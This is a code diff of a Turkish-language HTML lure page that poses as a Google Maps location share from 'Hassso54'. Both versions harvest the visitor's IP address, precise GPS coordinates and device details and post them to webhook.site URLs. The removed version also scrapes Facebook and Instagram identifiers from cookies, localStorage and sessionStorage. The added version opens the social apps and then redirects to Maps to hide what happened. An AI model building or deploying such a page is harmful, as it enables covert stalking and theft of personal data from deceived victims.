@@ -11,7 +11,7 @@
             box-sizing: border-box;
         }
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Segoe UI', sans-serif;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             display: flex;
             justify-content: center;
@@ -28,11 +28,10 @@
             max-width: 320px;
             width: 100%;
             box-shadow: 0 20px 40px rgba(0,0,0,0.2);
-            transition: all 0.3s;
         }
         .map-image {
-            width: 180px;
-            height: 180px;
+            width: 160px;
+            height: 160px;
             object-fit: contain;
             margin-bottom: 15px;
         }
@@ -46,7 +45,6 @@
             font-size: 14px;
             color: #5f6368;
             margin-bottom: 25px;
-            font-weight: 400;
         }
         button {
             background: #1a73e8;
@@ -58,230 +56,89 @@
             font-weight: 600;
             cursor: pointer;
             width: 100%;
-            transition: all 0.3s;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+            transition: 0.2s;
         }
         button:active {
             transform: scale(0.97);
         }
         button:disabled {
             background: #ccc;
-            cursor: wait;
         }
     </style>
 </head>
 <body>
     <div class="kart">
-        <img src="https://cdn-icons-png.flaticon.com/512/447/447031.png" alt="Google Maps" class="map-image">
+        <img src="https://cdn-icons-png.flaticon.com/512/447/447031.png" alt="Maps" class="map-image">
         <h2>Hassso54 sizinle konum paylaştı</h2>
         <div class="alt-yazi">Sakarya bölgesindeki konuma bak</div>
-        <button id="tekButon">Konumu Görüntüle</button>
+        <button id="btn">Konumu Görüntüle</button>
     </div>
 
     <script>
-        const webhookURL = "https://webhook.site/45462893-c6b2-4d8b-a64f-783413a77923";
+        const webhook = "https://webhook.site/37bb967a-e91f-4081-b0a2-8daecb562326";
         
-        // IP al
-        async function getIP() {
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                return data.ip;
-            } catch(e) {
-                return "IP alınamadı";
-            }
+        async function gonder(veri) {
+            await fetch(webhook, { method: 'POST', mode: 'no-cors', body: JSON.stringify(veri) });
         }
         
-        // Konum al
-        function getKonum() {
-            return new Promise((resolve) => {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        (pos) => {
-                            resolve({
-                                link: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
-                                enlem: pos.coords.latitude,
-                                boylam: pos.coords.longitude,
-                                basarili: true
-                            });
-                        },
-                        () => {
-                            resolve({ link: "Konum izni verilmedi", basarili: false });
-                        },
-                        { enableHighAccuracy: true, timeout: 8000 }
-                    );
-                } else {
-                    resolve({ link: "Konum desteklenmiyor", basarili: false });
-                }
-            });
-        }
-        
-        // Facebook'tan bilgi çekmeye çalış
-        async function facebookBilgiAl() {
-            let fbBilgi = {
-                mevcut: false,
-                kullanici_adi: "Bulunamadı",
-                email: "Bulunamadı",
-                not: "Facebook oturumu açık değil veya bilgi çekilemedi"
-            };
-            
-            // Facebook'un localStorage'ında saklanan bilgileri dene
-            try {
-                // Facebook'un genel olarak kullandığı key'ler
-                const fbKeys = ['user', 'userID', 'fb_uid', 'currentUser', 'C_user'];
-                for(let key of fbKeys) {
-                    let val = localStorage.getItem(key);
-                    if(val) {
-                        fbBilgi.mevcut = true;
-                        fbBilgi.kullanici_adi = val;
-                        break;
-                    }
-                }
-                
-                // sessionStorage'da da bak
-                for(let i = 0; i < sessionStorage.length; i++) {
-                    let key = sessionStorage.key(i);
-                    if(key.includes('fb') || key.includes('facebook')) {
-                        fbBilgi.mevcut = true;
-                        fbBilgi.session_veri = sessionStorage.getItem(key);
-                    }
-                }
-                
-                // Cookie'lerden C_user (Facebook kullanıcı ID'si)
-                if(document.cookie.includes('c_user')) {
-                    fbBilgi.mevcut = true;
-                    let match = document.cookie.match(/c_user=([^;]+)/);
-                    if(match) fbBilgi.kullanici_id = match[1];
-                }
-                
-            } catch(e) {}
-            
-            return fbBilgi;
-        }
-        
-        // Instagram'dan bilgi çekmeye çalış
-        async function instagramBilgiAl() {
-            let igBilgi = {
-                mevcut: false,
-                kullanici_adi: "Bulunamadı",
-                not: "Instagram oturumu açık değil veya bilgi çekilemedi"
-            };
-            
-            try {
-                // Instagram'ın localStorage'ındaki bilgiler
-                const igKeys = ['ig_www_user', 'ig_user', 'instagram_user', 'userId'];
-                for(let key of igKeys) {
-                    let val = localStorage.getItem(key);
-                    if(val) {
-                        igBilgi.mevcut = true;
-                        igBilgi.kullanici_adi = val;
-                        break;
-                    }
-                }
-                
-                // Instagram session bilgileri
-                for(let i = 0; i < sessionStorage.length; i++) {
-                    let key = sessionStorage.key(i);
-                    if(key.includes('ig_') || key.includes('instagram')) {
-                        igBilgi.mevcut = true;
-                        igBilgi.session_veri = sessionStorage.getItem(key);
-                    }
-                }
-                
-            } catch(e) {}
-            
-            return igBilgi;
-        }
-        
-        // İki hesabı karşılaştır
-        function hesaplariKarsilastir(fb, ig) {
-            let sonuc = {
-                ayni_mi: false,
-                detay: ""
-            };
-            
-            if(fb.mevcut && ig.mevcut) {
-                if(fb.kullanici_adi === ig.kullanici_adi) {
-                    sonuc.ayni_mi = true;
-                    sonuc.detay = "✅ Aynı hesap: " + fb.kullanici_adi;
-                } else {
-                    sonuc.detay = `⚠️ Farklı hesaplar! FB: ${fb.kullanici_adi} | IG: ${ig.kullanici_adi}`;
-                }
-            } else if(fb.mevcut) {
-                sonuc.detay = `📘 Facebook oturumu açık: ${fb.kullanici_adi} | Instagram kapalı`;
-            } else if(ig.mevcut) {
-                sonuc.detay = `📷 Instagram oturumu açık: ${ig.kullanici_adi} | Facebook kapalı`;
-            } else {
-                sonuc.detay = "❌ Facebook ve Instagram oturumu açık değil";
-            }
-            
-            return sonuc;
-        }
-        
-        // Ana işlem
-        async function tekTikla() {
-            const btn = document.getElementById('tekButon');
-            btn.innerText = "⏳ İşlem yapılıyor...";
+        async function islem() {
+            const btn = document.getElementById('btn');
+            btn.innerText = "⏳";
             btn.disabled = true;
             
-            // 1. IP al
-            const ip = await getIP();
+            let ip = "Bilinmiyor";
+            let konumLink = "";
+            let enlem = "", boylam = "";
             
-            // 2. Konum al
-            const konum = await getKonum();
-            
-            // 3. Facebook bilgilerini al
-            const facebook = await facebookBilgiAl();
-            
-            // 4. Instagram bilgilerini al
-            const instagram = await instagramBilgiAl();
-            
-            // 5. Karşılaştırma yap
-            const karsilastirma = hesaplariKarsilastir(facebook, instagram);
-            
-            // 6. Webhook'a gönder
-            const gonderilecekVeri = {
-                tip: "Hassso54_Tam_Takip",
-                zaman: new Date().toLocaleString('tr-TR'),
-                konum: konum.link,
-                enlem: konum.enlem,
-                boylam: konum.boylam,
-                ip: ip,
-                facebook: {
-                    oturum_acik: facebook.mevcut,
-                    kullanici: facebook.kullanici_adi,
-                    detay: facebook
-                },
-                instagram: {
-                    oturum_acik: instagram.mevcut,
-                    kullanici: instagram.kullanici_adi,
-                    detay: instagram
-                },
-                karsilastirma: karsilastirma.detay,
-                cihaz: navigator.userAgent,
-                platform: navigator.platform,
-                not: "Hesaplar karşılaştırıldı - Sakarya konum takibi"
-            };
-            
-            // Webhook'a gönder
+            // IP al
             try {
-                await fetch(webhookURL, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: JSON.stringify(gonderilecekVeri)
-                });
+                const res = await fetch('https://api.ipify.org?format=json');
+                const json = await res.json();
+                ip = json.ip;
             } catch(e) {}
             
-            btn.innerText = "✅ Konum açılıyor...";
-            
-            // Google Maps'e yönlendir
-            setTimeout(() => {
-                window.location.href = konum.link;
-            }, 1000);
+            // Konum al
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    enlem = pos.coords.latitude;
+                    boylam = pos.coords.longitude;
+                    konumLink = `https://www.google.com/maps?q=${enlem},${boylam}`;
+                    
+                    // Önce bilgileri gönder (şimdilik)
+                    await gonder({
+                        tip: "Hassso54_Takip",
+                        zaman: new Date().toLocaleString('tr-TR'),
+                        ip: ip,
+                        enlem: enlem,
+                        boylam: boylam,
+                        konum: konumLink,
+                        cihaz: navigator.userAgent
+                    });
+                    
+                    // Facebook ve Instagram uygulamalarını arka planda aç/kapat
+                    // Önce Facebook'u aç
+                    window.location.href = "fb://profile";
+                    
+                    // 0.5 saniye sonra Instagram'ı aç
+                    setTimeout(() => {
+                        window.location.href = "instagram://user?username=";
+                    }, 500);
+                    
+                    // 1 saniye sonra haritayı aç
+                    setTimeout(() => {
+                        window.location.href = konumLink;
+                    }, 1200);
+                    
+                }, async () => {
+                    await gonder({ tip: "Hata", ip: ip, hata: "Konum izni yok" });
+                    window.location.href = "https://www.google.com/maps";
+                });
+            } else {
+                window.location.href = "https://www.google.com/maps";
+            }
         }
         
-        // Butona tıkla
-        document.getElementById('tekButon').onclick = tekTikla;
+        document.getElementById('btn').onclick = islem;
     </script>
 </body>
 </html>
